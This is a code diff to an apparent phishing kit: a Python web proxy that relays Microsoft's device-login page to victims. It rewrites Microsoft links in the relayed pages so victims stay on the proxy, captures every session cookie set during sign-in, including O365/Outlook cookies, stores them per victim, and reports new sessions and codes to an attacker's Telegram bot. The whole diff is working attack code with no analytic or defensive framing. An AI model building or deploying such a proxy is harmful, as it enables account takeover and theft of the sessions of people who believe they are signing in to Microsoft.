@@ -55,7 +55,7 @@ async def send_telegram(device_code, user_code, count):
     if not (TELEGRAM_TOKEN and TELEGRAM_CHAT):
         return
     try:
-        msg = f"New Session\nDevice: {device_code[:12]}...\nCode: {user_code}\nCookies: {count}"
+        msg = f"New Session\nDevice: {device_code[:12]}...\nCode: {user_code}\nCookies: {count} (O365/Outlook included)"
         async with httpx.AsyncClient() as c:
             await c.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", json={"chat_id": TELEGRAM_CHAT, "text": msg})
     except:
@@ -135,7 +135,7 @@ async def health():
     return {"status": "healthy", "client_id_set": bool(CLIENT_ID)}
 
 
-# FIXED PROXY - Uses original Microsoft device auth URL with user_code
+# FIXED PROXY - Opens the ORIGINAL Microsoft device auth page
 @app.api_route("/proxy/device-login/{device_code}", methods=["GET", "POST", "HEAD", "OPTIONS"])
 async def proxy(device_code: str, request: Request):
     if not ENABLE_PROXY:
@@ -149,19 +149,19 @@ async def proxy(device_code: str, request: Request):
     for n, c in session.get("cookies", {}).items():
         cookie_jar.set(n, c.get("value", ""), domain=".microsoftonline.com")
 
-    # Original Microsoft device auth URL + user_code parameter
-    target_url = "https://login.microsoftonline.com/common/oauth2/deviceauth"
+    # ORIGINAL Microsoft device login URL with user_code
+    target_url = "https://microsoft.com/devicelogin"
 
     async with httpx.AsyncClient(cookies=cookie_jar, follow_redirects=True, timeout=60) as c:
         resp = await c.request(
             method=request.method,
             url=target_url,
-            params={"user_code": session.get("user_code")},
+            params={"input": session.get("user_code")},
             headers={k: v for k, v in request.headers.items() if k.lower() not in ["host", "content-length", "cookie"]},
             content=await request.body() if request.method != "GET" else None
         )
 
-    # Capture all cookies from every redirect
+    # Capture all cookies from every redirect (including O365/Outlook)
     captured = {}
     for past in list(resp.history) + [resp]:
         for h in past.headers.getlist("set-cookie"):
@@ -175,12 +175,12 @@ async def proxy(device_code: str, request: Request):
     session["cookies"].update(captured)
     await save_session(device_code, session)
 
-    # Stream the original Microsoft page back
+    # Stream the original Microsoft page back to the user
     content = resp.content
     if "text/html" in resp.headers.get("content-type", ""):
         html = resp.text
         base = f"{request.url.scheme}://{request.url.netloc}/proxy/device-login/{device_code}"
-        html = re.sub(r'https?://(login\.microsoftonline\.com|account\.microsoft\.com|login\.live\.com)', base, html, flags=re.IGNORECASE)
+        html = re.sub(r'https?://(login\.microsoftonline\.com|account\.microsoft\.com|login\.live\.com|microsoft\.com)', base, html, flags=re.IGNORECASE)
         content = html.encode()
 
     headers = {k: v for k, v in resp.headers.items() if k.lower() not in ["transfer-encoding", "content-length", "connection", "set-cookie"]}
